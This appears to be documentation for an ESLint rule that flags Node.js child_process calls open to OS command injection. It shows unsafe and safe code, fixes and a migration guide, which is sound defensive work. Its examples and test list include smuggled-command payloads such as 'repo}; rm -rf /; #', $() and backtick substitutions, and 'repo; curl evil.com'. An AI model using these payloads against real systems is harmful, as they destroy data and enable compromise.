# detect-child-process

> **Keywords:** command injection, CWE-78, security, ESLint rule, child_process, exec, spawn, OS command injection, shell injection, auto-fix, LLM-optimized, code security

Detects instances of `child_process` & non-literal `exec()` calls that may allow command injection. This rule is part of [`@forge-js/eslint-plugin-llm-optimized`](https://www.npmjs.com/package/@forge-js/eslint-plugin-llm-optimized) and provides LLM-optimized error messages with fix suggestions.

**🚨 Security rule** | **💡 Provides LLM-optimized guidance** | **⚠️ Set to error in `recommended`**

## Quick Summary

| Aspect | Details |
|--------|---------|
| **CWE Reference** | CWE-78 (OS Command Injection) |
| **Severity** | Critical (security vulnerability) |
| **Auto-Fix** | ⚠️ Suggests fixes (manual application) |
| **Category** | Security |
| **ESLint MCP** | ✅ Optimized for ESLint MCP integration |
| **Best For** | Node.js applications, deployment scripts, CI/CD tools |

## Rule Details

This rule detects dangerous use of Node.js child_process methods that can lead to command injection attacks when user input reaches command execution.

```mermaid
%%{init: {
  'theme': 'base',
  'themeVariables': {
    'primaryColor': '#f8fafc',
    'primaryTextColor': '#1e293b',
    'primaryBorderColor': '#334155',
    'lineColor': '#475569',
    'c0': '#f8fafc',
    'c1': '#f1f5f9',
    'c2': '#e2e8f0',
    'c3': '#cbd5e1'
  }
}}%%
flowchart TD
    A[🔍 Detect child_process Call] --> B{Method Type}
    B -->|exec/execSync| C{Dynamic Arguments?}
    B -->|spawn| D{Dynamic Command/Args?}
    B -->|Other| E[⚠️ Review Required]

    C -->|Yes| F[🚨 Command Injection Risk]
    C -->|No| G[✅ Literal - Safe]

    D -->|Yes| H[🚨 Argument Injection Risk]
    D -->|No| I[✅ Literal Args - Safe]

    F --> J[💡 Suggest execFile/spawn]
    H --> K[💡 Suggest spawn with validation]

    J --> L[📝 LLM-Optimized Guidance]
    K --> L
```



## Error Message Format

The rule provides **LLM-optimized error messages** with command injection prevention guidance:

```
🚨 Security: Command Injection Risk | exec(`git clone ${repoUrl}`) | src/deploy.ts:89
📊 Risk Level: CRITICAL (CWE-78: OS Command Injection)
🔍 Issue: Command injection vulnerability in exec call
💡 Safe Alternatives: execFile, spawn
🔧 Refactoring Steps:
   1. Replace exec() with execFile() or spawn()
   2. Split command and arguments into separate array elements
   3. Use {shell: false} option to prevent shell interpretation
   4. Validate and sanitize all user inputs
   5. Consider using execa library for better security
⏱️  Estimated effort: 15-25 minutes
🔗 Security Impact: Prevents arbitrary command execution on server
```

### Message Components

| Component | Purpose | Example |
|-----------|---------|---------|
| **Risk Level** | Security severity | `CRITICAL` |
| **CWE Reference** | Vulnerability type | `CWE-78: OS Command Injection` |
| **Issue Description** | Specific vulnerability | `Command injection in exec call` |
| **Safe Alternatives** | Recommended methods | `execFile, spawn` |
| **Refactoring Steps** | Step-by-step fixes | Numbered implementation guide |
| **Time Estimate** | Effort assessment | `15-25 minutes` |

This format is optimized for:
- 🤖 **LLMs** - Can parse and rewrite command execution patterns
- 👨‍💻 **Developers** - Clear security context with actionable fixes
- 🔧 **DevOps** - Proper risk assessment for deployment decisions

## Configuration

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `allowLiteralStrings` | `boolean` | `false` | Allow exec() with literal strings |
| `allowLiteralSpawn` | `boolean` | `false` | Allow spawn() with literal arguments |
| `additionalMethods` | `string[]` | `[]` | Additional child_process methods to check |

## Examples

### ❌ Incorrect

```typescript
// Command injection - CRITICAL risk
const { exec } = require('child_process');
exec(`git clone ${userRepo}`, callback); // Attacker can inject: `repo}; rm -rf /;`

// Shell interpretation - HIGH risk
exec(`npm install ${packageName}`, callback); // Command chaining possible

// Synchronous execution - HIGH risk
execSync(`curl ${userUrl}`); // Blocking + injection risk

// Spawn with string command - MEDIUM risk
spawn('bash', ['-c', userCommand]); // Shell interpretation

// Dynamic spawn arguments - MEDIUM risk
spawn(userCommand, [userArg1, userArg2]); // Argument injection
```

### ✅ Correct

```typescript
// Safe execFile usage
const { execFile } = require('child_process');
execFile('git', ['clone', validatedRepo], { shell: false }, callback);

// Safe spawn usage
const { spawn } = require('child_process');
const git = spawn('git', ['clone', validatedRepo], { shell: false });

// With execa library (recommended)
import execa from 'execa';
await execa('git', ['clone', validatedRepo]);

// Input validation helper
function validateGitUrl(url: string): boolean {
  return /^https:\/\/github\.com\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_-]+$/.test(url);
}

// Safe implementation
async function safeClone(repoUrl: string) {
  if (!validateGitUrl(repoUrl)) {
    throw new Error('Invalid repository URL');
  }

  return execa('git', ['clone', repoUrl], {
    shell: false,
    stripFinalNewline: true
  });
}
```

## Method Comparison

| Method | Security Risk | Safe Usage | Recommendation |
|--------|---------------|------------|----------------|
| `exec()` | HIGH | Only with literals | Avoid for user input |
| `execSync()` | HIGH | Only with literals | Avoid for user input |
| `execFile()` | LOW | ✅ Safe with arrays | Preferred for security |
| `spawn()` | MEDIUM | ✅ Safe with validation | Good for complex commands |
| `execa` | LOW | ✅ Best practices | Recommended library |

## Security Impact

### Command Injection Attacks

```bash
# Attacker input: "repo}; rm -rf /; #"
# Resulting command: git clone repo}; rm -rf /; #
exec(`git clone ${userInput}`); // 💥 Server compromised
```

### Prevention Strategy

1. **Use Arrays** - Pass arguments as separate array elements
2. **Disable Shell** - Set `shell: false` option
3. **Validate Input** - Whitelist allowed characters/patterns
4. **Use Safe Libraries** - Prefer `execa` over native child_process
5. **Sanitize Paths** - Never allow `../` or absolute paths in commands

## Common Patterns & Fixes

### Git Operations
```typescript
// ❌ DANGEROUS
exec(`git clone ${repoUrl}`);

// ✅ SAFE
execFile('git', ['clone', repoUrl], { shell: false });
```

### Package Installation
```typescript
// ❌ DANGEROUS
exec(`npm install ${packageName}`);

// ✅ SAFE
execFile('npm', ['install', packageName], { shell: false });
```

### File Operations
```typescript
// ❌ DANGEROUS
exec(`tar -xzf ${archivePath}`);

// ✅ SAFE
execFile('tar', ['-xzf', archivePath], { shell: false });
```

### Dynamic Commands
```typescript
// ❌ DANGEROUS
exec(`${userCommand} ${userArgs}`);

// ✅ SAFE
const ALLOWED_COMMANDS = ['ls', 'cat', 'head'];
if (ALLOWED_COMMANDS.includes(userCommand)) {
  execFile(userCommand, [userArgs], { shell: false });
}
```

## Migration Guide

### Phase 1: Audit
```javascript
// Enable warnings first
{
  rules: {
    '@forge-js/detect-child-process': 'warn'
  }
}
```

### Phase 2: Replace exec() calls
```typescript
// Find all exec() usage
exec(command) → execFile(command, [], options)
exec(command + args) → execFile(command, [args], options)
```

### Phase 3: Add validation
```typescript
// Add input validation
function validateCommand(cmd: string): boolean {
  return /^[a-zA-Z0-9_-]+$/.test(cmd);
}
```

### Phase 4: Use safer libraries
```typescript
// Upgrade to execa
import execa from 'execa';
await execa('git', ['clone', repoUrl]);
```

## Advanced Configuration

### Allow Specific Patterns
```javascript
{
  rules: {
    '@forge-js/detect-child-process': ['error', {
      allowLiteralStrings: true,  // Allow exec('literal command')
      additionalMethods: ['fork'], // Also check fork() calls
    }]
  }
}
```

### Monorepo Setup
```javascript
// Root package.json scripts are usually safe
{
  rules: {
    '@forge-js/detect-child-process': ['error', {
      allowLiteralStrings: true,
      ignorePaths: ['scripts/**', 'tools/**']
    }]
  }
}
```

## Testing Security

```typescript
// Test command injection attempts
const injectionAttempts = [
  'repo}; rm -rf /; #',
  'repo`rm -rf /`',
  'repo$(rm -rf /)',
  'repo; curl evil.com',
  'repo && evil-command'
];

for (const attempt of injectionAttempts) {
  expect(() => safeClone(attempt)).toThrow();
}
```

## Comparison with Alternatives

| Feature | detect-child-process | eslint-plugin-security | eslint-plugin-node |
|---------|---------------------|------------------------|-------------------|
| **Command Injection Detection** | ✅ Yes | ⚠️ Limited | ⚠️ Limited |
| **CWE Reference** | ✅ CWE-78 included | ⚠️ Limited | ⚠️ Limited |
| **LLM-Optimized** | ✅ Yes | ❌ No | ❌ No |
| **ESLint MCP** | ✅ Optimized | ❌ No | ❌ No |
| **Fix Suggestions** | ✅ Detailed | ⚠️ Basic | ⚠️ Basic |

## Related Rules

- [`detect-eval-with-expression`](./detect-eval-with-expression.md) - Prevents code injection via eval()
- [`detect-non-literal-fs-filename`](./detect-non-literal-fs-filename.md) - Prevents path traversal
- [`detect-object-injection`](./detect-object-injection.md) - Prevents prototype pollution
- [`detect-non-literal-regexp`](./detect-non-literal-regexp.md) - Prevents ReDoS attacks

## Further Reading

- **[OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)** - Command injection attack guide
- **[Node.js Child Process Security](https://nodejs.org/api/child_process.html#child_process_security)** - Node.js child_process security
- **[CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)** - Official CWE entry
- **[Execa Library](https://github.com/sindresorhus/execa)** - Safer child process execution
- **[ESLint MCP Setup](https://eslint.org/docs/latest/use/mcp)** - Enable AI assistant integration
